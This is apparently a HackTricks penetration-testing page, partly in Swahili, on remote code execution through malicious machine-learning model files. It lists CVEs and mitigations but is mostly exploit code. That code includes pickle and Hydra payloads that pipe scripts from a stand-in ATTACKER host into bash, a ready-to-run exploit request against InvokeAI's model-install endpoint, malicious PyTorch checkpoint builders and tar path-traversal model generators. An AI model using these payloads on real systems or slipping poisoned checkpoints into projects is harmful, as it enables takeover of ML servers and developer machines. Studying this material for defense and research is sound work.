# Modeli RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning modeli kawaida huwasilishwa katika formati mbalimbali, kama ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za watengenezaji au mifumo ya production ili kutumika. Kawaida modeli hazina msimbo hatari, lakini kuna baadhi ya matukio ambapo modeli inaweza kutumika kutekeleza msimbo wowote kwenye mfumo kama sifa iliyokusudiwa au kwa sababu ya udhaifu katika maktaba ya loading ya modeli.

Wakati wa kuandika, hizi ni baadhi ya mifano ya aina hii ya udhaifu:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna baadhi ya modeli zinazotegemea python pickle kama zile zinazotumika na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumiwa kutekeleza msimbo yeyote kwenye mfumo ikiwa hazipakwi kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotegemea pickle inaweza kuwa hatarishi kwa aina hii ya mashambulizi, hata kama hazijatajwa kwenye jedwali hapo juu.

### Hydra metadata → RCE (inafanya kazi hata na safetensors)

`hydra.utils.instantiate()` inaimport na kuitisha callable yoyote iliyo kwenye `_target_` iliyopangwa katika configuration/metadata object. Wakati maktaba zinapoweka **metadata ya modeli isiyoaminika** ndani ya `instantiate()`, mtu mwenye nia mbaya anaweza kusambaza callable na vigezo vinavyotekelezwa mara moja wakati wa loading ya modeli (hakuna pickle inahitajika).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Inachochewa kabla ya kuanzishwa kwa modeli katika NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, na FlexTok loaders.
- String block-list ya Hydra inaweza kupitishwa kupitia alternative import paths (e.g., `enum.bltns.eval`) au application-resolved names (e.g., `nemo.core.classes.common.os.system` → `posix`).
- FlexTok pia huchambua stringified metadata kwa kutumia `ast.literal_eval`, kuruhusu DoS (CPU/memory blowup) kabla ya wito wa Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ni kiolesura cha wavuti maarufu open-source kwa Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` inafanya **pickle deserialization**. Kwa sababu maudhui yanatoka moja kwa moja kutoka kwa URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kuweka kitu kibaya chenye njia maalum `__reduce__` ndani ya checkpoint; njia hiyo inatekelezwa **wakati wa deserialization**, ikisababisha **remote code execution (RCE)** kwenye seva ya InvokeAI.

Udhaifu ulipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa kutumia udhaifu

1. Tengeneza checkpoint haribifu:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Weka `payload.ckpt` kwenye HTTP server unayodhibiti (kwa mfano `http://ATTACKER/payload.ckpt`).
3. Chochea endpoint iliyo na udhaifu (hakuna uthibitishaji unaohitajika):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inapakua faili inaita `torch.load()` → gadget ya `os.system` inaendeshwa na mshambuliaji anapata utekelezaji wa msimbo katika muktadha wa mchakato wa InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` inafanya mchakato mzima kiotomatiki.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (bendera ya scan kwa chaguo-msingi **false**)  
•  `/api/v2/models/install` inapatikana kwa mshambuliaji  
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Mitigations

* Sasisha hadi **InvokeAI ≥ 5.4.3** – patchi inaweka `scan=True` kama chaguo-msingi na hufanya uchunguzi wa programu hasidi kabla ya deserialization.  
* Wakati unapoingiza checkpoints kwa kutumia programu, tumia `torch.load(file, weights_only=True)` au msaidizi mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Lazimisha allow-lists / signatures kwa vyanzo vya modeli na endesha huduma kwa ruhusa ndogo iwezekanavyo.

> ⚠️ Kumbuka kwamba **kila** muundo wa Python unaotegemea pickle (ikiwemo nyingi `.pt`, `.pkl`, `.ckpt`, `.pth` files) kwa asili hau salama ku-deserialize kutoka kwa vyanzo visivyo vya kuaminika.

---

Mfano wa ukarabati wa ad-hoc ikiwa lazima uendeleze matoleo ya zamani ya InvokeAI yakiendesha nyuma ya reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifunua loader ya checkpoint isiyo salama ambayo ilipiga simu moja kwa moja `torch.load()` kwa njia zilizotolewa na mtumiaji. Kwa sababu `torch.load` inategemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza code yoyote kupitia reducer wakati wa deserialization.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hili linaelekea kuwa RCE: Katika Python `pickle`, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) ambayo inarudisha callable na arguments. Callable inatekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo ndani ya checkpoint, itatekelezwa kabla ya weights yoyote kutumika.

Mfano mdogo wa checkpoint yenye madhara:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Njia za utoaji na radius ya mlipuko:
- Checkpoints/models zilizotrojanishwa zilizosambazwa kupitia repos, buckets, au artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Utekelezaji hufanyika ndani ya training/inference workers, mara nyingi kwa vibali vilivyoongezwa (kwa mfano, root katika containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. Loader mpya inathibitisha types/fields na inazuia callables zisizoidhinishwa kutumiwa wakati wa load.

Mwongozo wa kujilinda maalum kwa PyTorch checkpoints:
- Usifanye unpickle data usiokuwa wa kuaminika. Tumia fomati zisizotekelezeka kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX pale inapowezekana.
- Ikiwa lazima utumie PyTorch serialization, hakikisha `weights_only=True` (supported in newer PyTorch) au tumia unpickler iliyoorodheshwa (allow-listed) iliyobinafsishwa kama patch ya Transformers4Rec.
- Tekeleza model provenance/signatures na sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Angalia kwa ajili ya unexpected child processes kutoka ML services wakati wa checkpoint load; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeleo ya vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Mfano – kutengeneza model ya PyTorch hatari

- Unda model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD ya Tencent ina endpoint ya `resnet` inayodeserializa data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kwamba mshambuliaji wa mbali anaweza kulazimisha mhanga kupakia ukurasa/ufaili hatarishi, kisha kusukuma blob iliyoserializwa iliyotengenezwa kwa endpoint hiyo, na kusababisha deserialization kama `root`, na kupelekea kompromisi kamili.

Mtiririko wa exploit unafanana na matumizi mabaya ya kawaida ya pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, n.k.) kinaweza kutumiwa kama silaha kwa njia ile ile, bila kujali kama usafirishaji ulikuwa HTTP, WebSocket, au file iliyowekwa katika saraka inayofuatiliwa.

## Modeli kwa Path Traversal

Kama ilivyosemwa katika [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Kwa hivyo, inawezekana kutumia vibaya miundo hii kufanya path traversal attacks, kuruhusu kusoma faili yoyote kutoka kwa system ambapo modeli imepakiwa.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia msimbo ufuatao unaweza kuunda modeli ambayo itaunda symlink kwa directory `/tmp` wakati inapopakiwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Uchunguzi wa kina: Keras .keras deserialization and gadget hunting

Kwa mwongozo maalum kuhusu .keras internals, Lambda-layer RCE, the arbitrary import issue katika ≤ 3.8, na post-fix gadget discovery ndani ya allowlist, angalia:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Marejeo

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
